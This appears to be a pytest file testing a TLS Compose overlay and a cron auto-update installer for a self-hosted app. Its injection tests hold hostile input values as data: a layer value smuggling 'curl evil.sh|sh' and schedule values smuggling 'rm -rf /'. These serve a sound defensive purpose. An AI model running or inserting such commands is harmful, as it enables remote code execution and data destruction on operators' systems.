"""HOST-ONLY: these assertions read files outside the backend Docker build context.

Three regressions are pinned here, all in the path between "an operator enabled TLS" and
"an unattended update ran a week later". Each one failed silently -- no error at deploy
time, no error in the update log -- which is why they are guarded by tests rather than
left to review.
"""

from pathlib import Path
import os
import shutil
import subprocess

import pytest
import yaml


# Every path below sits outside the backend bind mount (./backend is mounted at /app in
# the dev container, so parents[2] there is the filesystem root, not the repo). The dev
# compose file exposes the repository read-only at /workspace; host runs fall back to the
# test's own location so the same guard works without Docker. Same shape as
# tests/test_env_surface_drift.py.
MOUNTED_REPO_ROOT = Path("/workspace")
ROOT = (
    MOUNTED_REPO_ROOT
    if (MOUNTED_REPO_ROOT / "backend" / "config" / "settings.py").is_file()
    else Path(__file__).resolve().parents[2]
)
pytestmark = pytest.mark.skipif(
    not (ROOT / "install.sh").exists(),
    reason="host-only: the repository root is not in the backend image",
)
INSTALLER = ROOT / "scripts" / "install-auto-update.sh"
CRON_MARKER = "scripts/update.sh"
LAYER_PREFIX = "SPACEWORKS_COMPOSE_LAYER="


class _ComposeLoader(yaml.SafeLoader):
    """Compose's `!reset` tag is not plain YAML, and the overlay uses it.

    `ports: !reset []` is how the overlay unpublishes a port inherited from the base
    file, so a bare `yaml.safe_load` raises ConstructorError on this document. The tag's
    value is irrelevant to every assertion below.
    """


_ComposeLoader.add_constructor("!reset", lambda loader, node: None)


def _tls_overlay():
    return yaml.load(  # noqa: S506 - _ComposeLoader is SafeLoader plus the !reset tag
        (ROOT / "docker" / "compose.tls.yml").read_text(encoding="utf-8"),
        Loader=_ComposeLoader,
    )


def test_tls_overlay_does_not_reintroduce_a_compose_profile():
    caddy = _tls_overlay()["services"]["caddy"]

    assert "profiles" not in caddy, (
        "The caddy service must not declare a Compose profile. Merging "
        "docker/compose.tls.yml is already gated on SPACEWORKS_COMPOSE_LAYER=tls|build-tls "
        "in scripts/spaceworks-compose.sh, so a profile is a redundant second activation "
        "gate. scripts/update.sh runs `up -d` WITHOUT --profile, so with a profile here "
        "every unattended update brings the stack back with no TLS terminator and then "
        "rolls back into that same plain-HTTP topology."
    )


def test_tls_overlay_passes_the_storage_domain_to_caddy():
    caddy = _tls_overlay()["services"]["caddy"]
    caddyfile = (ROOT / "deploy" / "Caddyfile").read_text(encoding="utf-8")

    assert "STORAGE_DOMAIN" in caddy["environment"], (
        "The caddy service must pass STORAGE_DOMAIN. Caddy expands {$STORAGE_DOMAIN} "
        "inside its own container, so without this entry it always resolves to the "
        "fallback and the https://files.<domain> endpoint that docs/self-hosting.md "
        "tells operators to configure silently does not exist -- presigned uploads from "
        "an HTTPS page then fail as active mixed content, with nothing server-side."
    )
    assert "{$STORAGE_DOMAIN" in caddyfile, (
        "deploy/Caddyfile must serve a site at {$STORAGE_DOMAIN}; the environment entry "
        "above is inert on its own."
    )


def test_the_tls_runbook_installs_the_updater_with_the_layer_prefix():
    doc = (ROOT / "docs" / "self-hosting.md").read_text(encoding="utf-8")

    assert "SPACEWORKS_COMPOSE_LAYER=tls bash scripts/install-auto-update.sh" in doc, (
        "docs/self-hosting.md must show the layer prefix on the installer command. "
        "SPACEWORKS_COMPOSE_LAYER=tls is a one-command assignment that does not "
        "persist, so an operator who brings up the TLS overlay and then runs a bare "
        "`bash scripts/install-auto-update.sh` records a plain-HTTP cron job -- and the "
        "next unattended update publishes the frontend on port 80 while Caddy holds it."
    )


def _install_into(tmp_path, environment):
    """Run the installer against stub `crontab` and Compose wrapper executables.

    The installer drives scripts/spaceworks-compose.sh before writing the crontab, so the
    stub has to exist and succeed for the crontab step to be reached at all.
    """
    (tmp_path / "scripts").mkdir()
    (tmp_path / "backups").mkdir()
    (tmp_path / "bin").mkdir()
    shutil.copy(INSTALLER, tmp_path / "scripts" / "install-auto-update.sh")
    shutil.copy(ROOT / "scripts" / "env-file.sh", tmp_path / "scripts" / "env-file.sh")

    wrapper = tmp_path / "scripts" / "spaceworks-compose.sh"
    wrapper.write_text(
        '#!/bin/sh\nprintf "%s\\n" "$*" >> "$FAKE_COMPOSE_CALLS"\n',
        encoding="utf-8",
    )
    wrapper.chmod(0o755)

    crontab = tmp_path / "bin" / "crontab"
    crontab.write_text(
        '#!/bin/sh\nprintf "%s\\n" "$*" >> "$FAKE_CRON_CALLS"\n'
        '[ "$1" != "-l" ] || exit 0\ncat > "$FAKE_CRON_OUT"\n',
        encoding="utf-8",
    )
    crontab.chmod(0o755)

    installed = tmp_path / "cron.txt"
    completed = subprocess.run(
        [shutil.which("bash") or "bash", (tmp_path / "scripts" / "install-auto-update.sh").as_posix()],
        cwd=tmp_path,
        env={
            "PATH": f"{tmp_path / 'bin'}{os.pathsep}{os.environ['PATH']}",
            "FAKE_CRON_OUT": installed.as_posix(),
            "FAKE_CRON_CALLS": (tmp_path / "crontab-calls.txt").as_posix(),
            "FAKE_COMPOSE_CALLS": (tmp_path / "compose-calls.txt").as_posix(),
            **environment,
        },
        capture_output=True,
        text=True,
    )
    return completed, installed


@pytest.mark.parametrize(
    ("environment", "expected"),
    [
        pytest.param({}, None, id="no-layer-vars"),
        pytest.param(
            {"SPACEWORKS_COMPOSE_LAYER": "tls"}, "tls", id="explicit-tls"
        ),
        pytest.param(
            {"SPACEWORKS_COMPOSE_LAYER": "build-tls"},
            "build-tls",
            id="explicit-build-tls",
        ),
        pytest.param(
            {"SPACEWORKS_COMPOSE_BUILD_LAYER": "1"}, "build", id="legacy-build-flag"
        ),
        pytest.param(
            {
                "SPACEWORKS_COMPOSE_LAYER": "tls",
                "SPACEWORKS_COMPOSE_BUILD_LAYER": "1",
            },
            "tls",
            id="explicit-layer-outranks-legacy-flag",
        ),
    ],
)
def test_installed_cron_command_preserves_the_active_compose_layer(
    tmp_path, environment, expected
):
    completed, installed = _install_into(tmp_path, environment)

    assert completed.returncode == 0, completed.stderr
    job = next(
        line
        for line in installed.read_text(encoding="utf-8").splitlines()
        if CRON_MARKER in line
    )

    if expected is None:
        # An existing plain-HTTP install must keep a byte-identical cron line, so the
        # variable is omitted entirely rather than written as an explicit `none`.
        assert LAYER_PREFIX not in job, (
            "With no layer selected the installed cron line must be unchanged from the "
            f"historical form, but it carried a layer: {job}"
        )
    else:
        assert f"{LAYER_PREFIX}{expected}" in job, (
            "The installed cron command must carry the Compose layer that was active "
            "when the schedule was installed. scripts/spaceworks-compose.sh reads the "
            "layer only from the calling shell, so without it a cron update deploys the "
            "BASE topology, whose frontend service publishes port 80 while Caddy already "
            f"holds 80/443 -- the update fails and rollback repeats it. Got: {job}"
        )


@pytest.mark.parametrize(
    "layer",
    ["bogus", "tls; curl evil.sh|sh"],
    ids=["unknown-layer", "command-injection"],
)
def test_installer_refuses_an_unvalidated_layer(tmp_path, layer):
    completed, installed = _install_into(
        tmp_path, {"SPACEWORKS_COMPOSE_LAYER": layer}
    )

    assert completed.returncode != 0, (
        f"The installer must refuse the layer {layer!r} instead of proceeding."
    )
    assert not installed.exists(), (
        "The installer must refuse before the crontab is written. The layer is "
        "interpolated into a crontab line, so the whitelist is the injection defense; "
        "reaching the crontab step at all means an unvalidated value was accepted."
    )


@pytest.mark.parametrize(
    ("environment", "dotenv", "expected"),
    [
        ({}, None, "0 3 * * 0"),
        ({"SPACEWORKS_UPDATE_SCHEDULE": "*/5 * * * *"}, None, "*/5 * * * *"),
        ({}, 'SPACEWORKS_UPDATE_SCHEDULE="15 4 * * 1"\n', "15 4 * * 1"),
        (
            {"SPACEWORKS_UPDATE_SCHEDULE": "*/5 * * * *"},
            "SPACEWORKS_UPDATE_SCHEDULE=15 4 * * 1\n",
            "*/5 * * * *",
        ),
    ],
    ids=["default", "shell", "dotenv", "shell-wins"],
)
def test_installed_cron_uses_the_resolved_schedule(tmp_path, environment, dotenv, expected):
    """Cron must keep the operator's polling cadence across unattended updates."""
    if dotenv is not None:
        (tmp_path / ".env").write_text(dotenv, encoding="utf-8")
    completed, installed = _install_into(tmp_path, environment)

    assert completed.returncode == 0, completed.stderr
    job = next(line for line in installed.read_text().splitlines() if CRON_MARKER in line)
    assert job.startswith(f"{expected} cd ")
    assert "update_control set-auto on" in (tmp_path / "compose-calls.txt").read_text()
    assert (tmp_path / "crontab-calls.txt").read_text().splitlines() == ["-l", "-"]


@pytest.mark.parametrize(
    "schedule",
    [
        "* * * * *; rm -rf /", "* * * *", "*/0 * * * *", "60 * * * *",
        "5-1 * * * *", "0 3 * * 0%", "0 3 * * 0\n* * * * * evil",
    ],
)
def test_invalid_schedule_has_no_application_or_crontab_side_effects(tmp_path, schedule):
    """Reject cron injection before enabling application updates or even reading crontab."""
    completed, installed = _install_into(
        tmp_path, {"SPACEWORKS_UPDATE_SCHEDULE": schedule}
    )

    assert completed.returncode != 0, completed.stdout
    assert not installed.exists()
    assert not (tmp_path / "crontab-calls.txt").exists()
    assert not (tmp_path / "compose-calls.txt").exists()
